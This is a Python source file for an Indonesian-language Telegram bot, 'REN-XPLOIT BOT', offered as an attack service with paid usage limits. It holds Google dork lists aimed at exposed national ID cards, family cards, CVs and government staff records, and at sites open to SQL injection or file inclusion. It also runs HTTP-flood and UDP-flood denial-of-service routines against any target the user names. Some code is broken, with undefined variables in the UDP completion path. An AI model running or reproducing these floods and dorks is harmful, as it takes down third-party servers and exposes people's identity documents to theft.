from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, CallbackContext, ChatMemberHandler
from bs4 import BeautifulSoup
import urllib.parse
import random
import requests
import os
import socket
import time
import asyncio
import threading
import random
import aiohttp

BOT_TOKEN = input("masukan token bot tele: ")

DEFAULT_LIMIT = 100000

user_data = {}

USER_AGENTS = [
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.170 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12.3; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 12; en-US; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/112.0.1722.39",
    "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/96.0.4664.45 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Linux; U; Android 11; en-US; Mi 9T Pro) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
    "Opera/9.80 (Windows NT 10.0; Win64; x64) Presto/2.12.388 Version/12.18",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_4) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 9; SM-J400F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Mobile Safari/537.36"
]

default_queries1 = [
    "intitle:index.of inurl:ktp ext:pdf OR ext:xls OR ext:doc OR ext:zip",
    "intitle:index.of inurl:kk ext:pdf OR ext:xls OR ext:doc OR ext:zip",
    "intitle:index.of inurl:sim ext:pdf OR ext:xls OR ext:doc OR ext:zip",
    "intitle:index.of inurl:data pegawai ext:pdf OR ext:xls OR ext:doc",
    "intitle:index.of inurl:anggaran dpr ext:pdf OR ext:xls OR ext:doc",

    "directory: dokumen dpr filetype:pdf",
    "directory: laporan dpr filetype:xls",
    "directory: data anggota dpr filetype:doc",
    "directory: rapat dpr filetype:zip",

    "index of/ ktp",
    "index of/ kk",
    "index of/ dokumen dpr",
    "index of/ anggaran dpr",
    "index of/ data pegawai dpr",
    "directory: file penting dpr",
    "file: ktp AND kk AND sim",
    "file: laporan dpr AND anggaran",

    "intext:KTP filetype:pdf",
    "intext:KK filetype:doc",
    "intext:DPR filetype:xls",
    "intext:SENSITIF AND DPR filetype:zip",
    "intext:PRIVATE OR confidential ext:pdf",

    "intitle:index.of inurl:biodata ext:pdf OR ext:xls OR ext:doc OR ext:zip",
    "intitle:index.of inurl:cv ext:pdf OR ext:xls OR ext:doc OR ext:zip",
    "intitle:index.of inurl:resumé ext:pdf OR ext:xls OR ext:doc OR ext:zip",
    "filetype:pdf biodata OR cv OR resumé",
    "filetype:xls biodata OR cv OR resumé",
    "intitle:index.of inurl:profile ext:pdf OR ext:xls OR ext:doc",
    "intitle:index.of inurl:personal information ext:pdf OR ext:xls OR ext:doc",
    "intext:biodata AND filetype:pdf",
    "intext:cv AND filetype:doc",
    "intext:resumé AND filetype:xls",
    "intext:personal details AND ext:pdf",

    "directory: dokumen kominfo filetype:pdf",
    "directory: laporan kominfo filetype:xls",
    "directory: data pegawai kominfo filetype:doc",
    "intitle:index.of inurl:kominfo ext:pdf OR ext:xls OR ext:doc OR ext:zip",
    "intitle:index.of inurl:kominfo profile ext:pdf OR ext:xls",
    "intext:kominfo AND biodata AND ext:pdf",
    
    "directory: dokumen polri filetype:pdf",
    "directory: laporan polri filetype:xls",
    "directory: data anggota polri filetype:doc",
    "intitle:index.of inurl:polri ext:pdf OR ext:xls OR ext:doc OR ext:zip",
    "intitle:index.of inurl:polri profile ext:pdf OR ext:xls",
    "intext:polri AND biodata AND ext:pdf",

    "directory: dokumen nasa filetype:pdf",
    "directory: laporan nasa filetype:xls",
    "directory: data pegawai nasa filetype:doc",
    "intitle:index.of inurl:nasa ext:pdf OR ext:xls OR ext:doc OR ext:zip",
    "intitle:index.of inurl:nasa profile ext:pdf OR ext:xls",
    "intext:nasa AND biodata AND ext:pdf",

    "inurl:pegawai OR anggota OR staff filetype:pdf",
    "inurl:pegawai OR anggota OR staff filetype:xls",
    "inurl:pegawai OR anggota OR staff filetype:doc",
    "filetype:pdf biodata AND organization",
    "filetype:xls biodata AND organization",
    "intitle:index.of inurl:pegawai ext:pdf OR ext:xls OR ext:doc",
]

default_queries2 = [
    "inurl:rubp.php?idr=",
    "inurl:offer.php?idf=",
    "inurl:art.php?idm=",
    "inurl:title.php?",
    "inurl:index.php?id=",
    "inurl:page.php?catid=",
    "inurl:view.php?item=",
    "inurl:article.php?ID=",
    "inurl:product.php?pid=",
    "inurl:news.php?nid=",
    "inurl:blog.php?post_id=",
    "inurl:detail.php?cid=",
    "inurl:shop.php?sid=",
    "inurl:store.php?product_id=",
    "inurl:read.php?tid=",
    "inurl:event.php?eid=",
    "inurl:cat.php?catid=",
    "inurl:post.php?pid=",
    "inurl:item.php?id=",
    "inurl:show.php?sid=",

    "filetype:php inurl:index.php?id=",
    "filetype:php inurl:product.php?pid=",
    "filetype:asp inurl:default.asp?id=",
    "filetype:jsp inurl:blog.jsp?blog_id=",
    "filetype:html inurl:article.html?id=",
    "filetype:cgi inurl:view.cgi?id=",
    "filetype:php inurl:view.php?id=",
    "filetype:php inurl:detail.php?id=",
    "filetype:php inurl:show.php?id=",
    "filetype:php inurl:order.php?orderid=",

    "intitle:index.of inurl:admin",
    "intitle:index.of inurl:backup",
    "intitle:index.of inurl:database",
    "intitle:index.of inurl:config",
    "intitle:index.of inurl:password",
    "intitle:index.of inurl:uploads",
    "intitle:index.of inurl:private",
    "intitle:index.of inurl:files",
    "intitle:index.of inurl:data",
    "intitle:index.of inurl:temp",

    "inurl:index.php?id=1 AND 1=1",
    "inurl:index.php?id=1 AND 1=2",
    "inurl:index.php?id=1'--",
    "inurl:index.php?id=1'/*",
    "inurl:index.php?id=1 ORDER BY 1",
    "inurl:index.php?id=1 UNION SELECT 1,2,3",
    "inurl:index.php?id=1 UNION ALL SELECT NULL,NULL--",
    "inurl:product.php?id=1 AND 1=1",
    "inurl:product.php?id=1 AND 1=2",
    "inurl:product.php?id=1'--",

    "inurl:index.php?page=",
    "inurl:page.php?file=",
    "inurl:home.php?include=",
    "inurl:content.php?view=",
    "inurl:download.php?path=",
    "inurl:file.php?file=",
    "inurl:load.php?module=",
    "inurl:template.php?file=",
    "inurl:config.php?file=",
    "inurl:load.php?page=",

    "inurl:admin/login.php",
    "inurl:admin/index.php",
    "inurl:login.php?admin=",
    "inurl:admin.asp",
    "inurl:login.jsp",
    "inurl:cpanel.php",
    "inurl:controlpanel/login.php",
    "inurl:admin/admin.php",
    "inurl:adminpanel.php",
    "inurl:admin_dashboard.php",

    "site:gov inurl:login",
    "site:edu inurl:admin",
    "site:org inurl:login",
    "site:com inurl:register",
    "site:net inurl:forgot",
    "site:gov inurl:password",
    "site:edu inurl:database",
    "site:org inurl:private",
    "site:com inurl:temp",
    "site:net inurl:backup",

    "inurl:signin.php",
    "inurl:signup.php",
    "inurl:forgotpassword.php",
    "inurl:reset.php",
    "inurl:auth.php",
    "inurl:access.php",
    "inurl:secure.php",
    "inurl:portal.php",
    "inurl:login.cgi",
    "inurl:admin.cgi",
]


def google_search(query, num_results=10):
    query = urllib.parse.quote_plus(query)
    results = []
    headers = {'User-Agent': random.choice(USER_AGENTS)}

    url = f"https://www.google.com/search?q={query}&num={num_results}"
    try:
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')

        for g in soup.find_all('div', class_='tF2Cxc'):
            link_tag = g.find('a')
            title_tag = g.find('h3')
            desc_tag = g.find('div', class_='IsZvec')
            if link_tag and title_tag:
                results.append({
                    'title': title_tag.text,
                    'link': link_tag['href'],
                    'description': desc_tag.text.strip() if desc_tag else "No description"
                })
    except Exception as e:
        print(f"Error fetching data: {e}")

    return results

async def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    user_first_name = update.effective_user.first_name

    if user_id not in user_data:
        user_data[user_id] = {"limit": DEFAULT_LIMIT}

    user_limit = user_data[user_id]["limit"]

    welcome_message = (
        f"👋 *Hallo, {user_first_name}!* Selamat datang di *REN-XPLOIT BOT* 🚀\n\n"
        f"🌟 Limit Anda saat ini: *{DEFAULT_LIMIT - user_limit}/{DEFAULT_LIMIT}*\n\n"
        "💡 *Fitur yang tersedia:*\n"
        "1️⃣ `/dorkingv1 [jumlah]` - Scrape data pemerintah default versi 1\n"
        "2️⃣ `/dorkingv2 [jumlah]` - Scrape data website vuln default versi 2\n"
        "3️⃣ `/dorkingv3` - Masukkan custom query\n"
        "4️⃣ `/add [kode_premium]` - Tambahkan limit menggunakan kode premium\n"
        "5️⃣ `/http_attack [url] [durasi]` - Menyerang HTTP target tertentu\n"
        "6️⃣ `/udp_attack [ip] [port] [durasi]` - Menyerang UDP target tertentu\n\n"
        "🔥 Gunakan perintah yang sesuai atau klik tombol di bawah untuk langsung mulai!"
    )

    keyboard = [
        [InlineKeyboardButton("📋 Dorking V1", callback_data="dorkingv1")],
        [InlineKeyboardButton("🌐 Dorking V2", callback_data="dorkingv2")],
        [InlineKeyboardButton("🔎 Dorking V3 (Custom)", callback_data="dorkingv3")],
        [InlineKeyboardButton("🚀 HTTP Attack", callback_data="http_attack")],
        [InlineKeyboardButton("💥 UDP Attack", callback_data="udp_attack")],
        [InlineKeyboardButton("➕ Tambah Limit", callback_data="add_limit")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        welcome_message,
        reply_markup=reply_markup,
        parse_mode="Markdown",
    )

async def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()

    if query.data == "dorkingv1":
        await query.edit_message_text("⚡ *Dorking V1* siap digunakan! Gunakan `/dorkingv1 [jumlah]`.")
    elif query.data == "dorkingv2":
        await query.edit_message_text("🌐 *Dorking V2* siap digunakan! Gunakan `/dorkingv2 [jumlah]`.")
    elif query.data == "dorkingv3":
        await query.edit_message_text(
            "🔎 *Dorking V3* aktif! Masukkan custom query dengan format:\n"
            "`/dorkingv3 [query1],[query2] [jumlah]`",
            parse_mode="Markdown",
        )
    elif query.data == "http_attack":
        await query.edit_message_text(
            "🚀 *HTTP Attack* aktif! Gunakan format:\n"
            "`/http_attack [url] [durasi]`\n\n"
            "Contoh: `/http_attack http://target.com  GET 10 10`",
            parse_mode="Markdown",
        )
    elif query.data == "udp_attack":
        await query.edit_message_text(
            "💥 *UDP Attack* aktif! Gunakan format:\n"
            "`/udp_attack [ip] [port] [durasi]`\n\n"
            "Contoh: `/udp_attack 192.168.1.1 80 60`",
            parse_mode="Markdown",
        )
    elif query.data == "add_limit":
        await query.edit_message_text("➕ Gunakan `/add [kode_premium]` untuk menambah limit Anda.")

    if query.data == "introduce":
        await query.edit_message_text(text="💬 Silahkan Kirim Pesan /Start Untuk Memulai Bot!!!")
    elif query.data == "rules":
        await query.edit_message_text(text="📜 Berikut adalah aturan grup: ...\n1. Tidak Boleh Spam Bot Nya!!!.\n2. Hormati sesama anggota.\n3. Dilarang berbicara kasar.\n...")
        

async def dorking(update: Update, context: CallbackContext, queries, num_results):
    user_id = update.effective_user.id
    if user_id not in user_data or user_data[user_id]["limit"] <= 0:
        await update.message.reply_text("Limit Anda habis. Gunakan kode premium untuk menambah limit.")
        return

    query = random.choice(queries)
    results = google_search(query, num_results)

    if results:
        for result in results:
            await update.message.reply_text(
                f"Title: {result['title']}\nLink: {result['link']}\nDescription: {result['description']}"
            )
        user_data[user_id]["limit"] -= 2
    else:
        await update.message.reply_text(f"Tidak ada hasil ditemukan untuk query: {query}")

async def dorkingv1(update: Update, context: CallbackContext):
    num_results = 10
    if context.args:
        try:
            num_results = int(context.args[0])
        except ValueError:
            await update.message.reply_text("Jumlah harus berupa angka.")
            return
    await dorking(update, context, default_queries1, num_results)

async def dorkingv2(update: Update, context: CallbackContext):
    num_results = 10
    if context.args:
        try:
            num_results = int(context.args[0])
        except ValueError:
            await update.message.reply_text("Jumlah harus berupa angka.")
            return
    await dorking(update, context, default_queries2, num_results)

async def dorkingv3(update: Update, context: CallbackContext):
    if len(context.args) < 2:
        await update.message.reply_text(
            "Silakan masukkan query custom dan jumlah hasil setelah perintah ini.\n"
            "Contoh: /dorkingv3 inurl:/article.php?ID=,inurl:/index.php?id= 5"
        )
        return

    try:
        query_input = " ".join(context.args[:-1])
        queries = [query.strip() for query in query_input.split(",")]  # Split query by koma
        num_results = int(context.args[-1])  # Argumen terakhir sebagai jumlah hasil
    except ValueError:
        await update.message.reply_text("Jumlah hasil harus berupa angka.")
        return

    if not queries:
        await update.message.reply_text("Query tidak valid. Pisahkan dengan koma jika menggunakan lebih dari satu query.")
        return

    user_id = update.effective_user.id
    if user_id not in user_data or user_data[user_id]["limit"] <= 0:
        await update.message.reply_text("Limit Anda habis. Gunakan kode premium untuk menambah limit.")
        return

    for query in queries:
        results = google_search(query, num_results)
        if results:
            for result in results:
                await update.message.reply_text(
                    f"Title: {result['title']}\nLink: {result['link']}\nDescription: {result['description']}"
                )
        else:
            await update.message.reply_text(f"Tidak ada hasil ditemukan untuk query: {query}")

    user_data[user_id]["limit"] -= len(queries)

async def welcome_new_member(update: Update, context: CallbackContext):
    new_member = update.message.new_chat_members[0]  # Ambil user baru
    chat_id = update.message.chat_id  # ID grup
    user_name = new_member.full_name  # Nama lengkap user baru
    
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"🌟 Selamat datang di grup, {new_member.mention_html()}! 🎉\n"
             "Kami senang kamu bergabung! 🙌\n\n"
             "Jangan ragu untuk memperkenalkan dirimu dan aktif di sini! 💬\n\n"
             "Tunggu apa lagi? Yuk pilih tombol di bawah ini untuk memulai petualanganmu! 🚀",
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("Perkenalkan Diri", callback_data="introduce")],
            [InlineKeyboardButton("Lihat Aturan Grup", callback_data="rules")]
        ])
    )
    

async def add(update: Update, context: CallbackContext):
    if not context.args:
        await update.message.reply_text("Gunakan /add [kode_premium] untuk menambahkan limit.")
        return

    code = context.args[0]
    user_id = update.effective_user.id

    try:
        codes = {}
        with open("premium_codes.txt", "r") as file:
            for line in file.readlines():
                line = line.strip()  # Menghapus spasi atau baris kosong
                if ":" in line:  # Hanya proses yang punya ":" (kode dan limit)
                    premium_code, limit = line.split(":")
                    try:
                        codes[premium_code] = int(limit)
                    except ValueError:
                        continue  # Jika limit bukan angka, lanjutkan ke baris berikutnya
    except FileNotFoundError:
        codes = {}

    if code in codes:
        user_data[user_id]["limit"] += codes[code]
        del codes[code]  # Hapus kode yang sudah digunakan

        with open("premium_codes.txt", "w") as file:
            for key, value in codes.items():
                file.write(f"{key}:{value}\n")

        await update.message.reply_text("Kode premium berhasil digunakan! Limit Anda telah ditambahkan.")
    else:
        await update.message.reply_text("Kode premium tidak valid atau sudah digunakan.")
        
async def send_request(session, url, method, headers, request_count):
    success_count = 0
    for _ in range(request_count):
        try:
            if method == "GET":
                async with session.get(url, headers=headers) as response:
                    if response.status == 200:
                        success_count += 1
            elif method == "POST":
                payload = {"random_payload": str(random.randint(1000, 9999))}
                async with session.post(url, headers=headers, data=payload) as response:
                    if response.status == 200:
                        success_count += 1
            else:
                async with session.request(method, url, headers=headers) as response:
                    if response.status == 200:
                        success_count += 2
        except aiohttp.ClientError as e:
            print(f"[ERROR] Request error: {e}")
    return success_count

async def perform_ddos(url, method, headers, threads, request_count):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(threads):
            tasks.append(send_request(session, url, method, headers, request_count))
        
        results = await asyncio.gather(*tasks)
        total_success = sum(results)
        print(f"[INFO] Total request berhasil: {total_success}/{threads * request_count} ke {url}")

async def http_attack(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    user_first_name = update.effective_user.first_name

    if user_id not in user_data or user_data[user_id]["limit"] <= 0:
        await update.message.reply_text(
            f"⚠️ *Maaf, {user_first_name}!* Limit Anda habis.\n"
            "Gunakan kode premium untuk menambah limit dengan perintah `/add [kode_premium]`.",
            parse_mode="Markdown",
        )
        return

    if len(context.args) < 4:
        await update.message.reply_text(
            "❌ *Format salah!*\n"
            "Gunakan perintah dengan format:\n"
            "`/http_attack [url] [GET/POST] [threads] [request_count]`\n\n"
            "🔍 *Contoh:* `/http_attack https://example.com GET 50 1000`",
            parse_mode="Markdown",
        )
        return

    try:
        url, method, threads, request_count = context.args
        threads = int(threads)
        request_count = int(request_count)

        if threads <= 0 or request_count <= 0:
            raise ValueError("Jumlah threads dan request count harus lebih dari 0.")
    except ValueError as e:
        await update.message.reply_text(f"❌ *Error:* {e}")
        return

    await update.message.reply_text(
        f"⚡ *Serangan HTTP dimulai!*\n\n"
        f"📌 *Target:* `{url}`\n"
        f"📣 *Metode:* `{method.upper()}`\n"
        f"🔢 *Jumlah threads:* `{threads}`\n"
        f"🔄 *Jumlah request:* `{request_count}`\n"
        f"🔥 *Dijalankan oleh:* `{user_first_name}`\n\n"
        f"Harap tunggu hingga serangan selesai...",
        parse_mode="Markdown",
    )

    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
        ]),
        "Accept": "*/*",
        "Connection": "keep-alive",
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Language": "en-US,en;q=0.9"
    }

    start_time = time.time()
    await perform_ddos(url, method, headers, threads, request_count)

    user_data[user_id]["limit"] -= 3

    elapsed_time = int(time.time() - start_time)
    await update.message.reply_text(
        f"✅ *Serangan HTTP selesai!* \n\n"
        f"⏱️ *Durasi total:* `{elapsed_time} detik`\n"
        f"🎯 *Target:* `{url}`\n"
        f"📣 *Metode:* `{method.upper()}`\n"
        f"🔢 *Jumlah threads:* `{threads}`\n"
        f"🔄 *Jumlah request:* `{request_count}`\n"
        f"💡 *Limit tersisa:* `{user_data[user_id]['limit']}`\n\n"
        f"Gunakan `/add [kode_premium]` untuk menambah limit Anda.",
        parse_mode="Markdown",
    )
   
async def udp_attack(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    user_first_name = update.effective_user.first_name

    if user_id not in user_data or user_data[user_id]["limit"] <= 0:
        await update.message.reply_text(
            f"⚠️ *Maaf, {user_first_name}!* Limit Anda habis.\n"
            "Gunakan kode premium untuk menambah limit dengan perintah `/add [kode_premium]`.",
            parse_mode="Markdown",
        )
        return

    if len(context.args) < 3:
        await update.message.reply_text(
            "❌ *Format salah!*\n"
            "Gunakan perintah dengan format:\n"
            "`/udp_attack [ip] [port] [duration]`\n\n"
            "🔍 *Contoh:* `/udp_attack 192.168.1.1 80 60`",
            parse_mode="Markdown",
        )
        return

    try:
        ip = context.args[0]
        port = int(context.args[1])
        duration = int(context.args[2])

        if not (1 <= port <= 65535):
            raise ValueError("Port harus di antara 1-65535.")
        if duration <= 0:
            raise ValueError("Durasi harus lebih dari 0 detik.")
    except ValueError as e:
        await update.message.reply_text(f"❌ *Error:* {e}")
        return

    await update.message.reply_text(
        f"⚡ *Serangan UDP dimulai!*\n\n"
        f"📌 *Target:* `{ip}:{port}`\n"
        f"⏳ *Durasi:* `{duration} detik`\n"
        f"🔥 *Dijalankan oleh:* `{user_first_name}`\n\n"
        f"Harap tunggu hingga serangan selesai...",
        parse_mode="Markdown",
    )

    await start_udp_flood(ip, port, duration, user_id)

async def start_udp_flood(ip, port, duration, user_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Buat socket UDP
    bytes_data = random._urandom(1024)  # Generate paket acak
    start_time = time.time()
    
    total_sent = 0  # Menambahkan counter untuk menghitung total paket yang dikirim

    try:
        while time.time() - start_time < duration:
            sock.sendto(bytes_data, (ip, port))  # Kirim paket ke IP dan port yang ditentukan
            total_sent += 1
            if total_sent % 1000 == 0:  # Kirim laporan tiap 1000 paket
                print(f"🔊 *{total_sent} berhasil mengirim ddos ke {ip}:{port}")
        
        await finish_attack(user_id)
        
    except Exception as e:
        print(f"❌ Error dalam serangan UDP: {e}")
        await update.message.reply_text(f"❌ *Terjadi error:* {e}")

async def finish_attack(user_id):
    user_data[user_id]["limit"] -= 4

    await update.message.reply_text(
        f"✅ *Serangan UDP selesai!* \n\n"
        f"⏱️ *Durasi total:* `{int(time.time() - start_time)} detik`\n"
        f"🎯 *Target:* `{ip}:{port}`\n"
        f"💡 *Limit tersisa:* `{user_data[user_id]['limit']}`\n\n"
        f"Gunakan `/add [kode_premium]` untuk menambah limit Anda.",
        parse_mode="Markdown",
    )
    
def main():
    application = Application.builder().token(BOT_TOKEN).build()

    chat_member_handler = ChatMemberHandler(welcome_new_member, ChatMemberHandler.CHAT_MEMBER)
    application.add_handler(chat_member_handler)

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("dorkingv1", dorkingv1))
    application.add_handler(CommandHandler("dorkingv2", dorkingv2))
    application.add_handler(CommandHandler("dorkingv3", dorkingv3))
    application.add_handler(CommandHandler("add", add))
    application.add_handler(CommandHandler("http_attack", http_attack))  # Tambahkan handler HTTP attack
    application.add_handler(CommandHandler("udp_attack", udp_attack))    # Tambahkan handler UDP attack
    application.add_handler(CallbackQueryHandler(button_handler))        # Jika ada callback button

    print("Bot Berhasil Di Pasang...")
    application.run_polling()

if __name__ == "__main__":
    main()
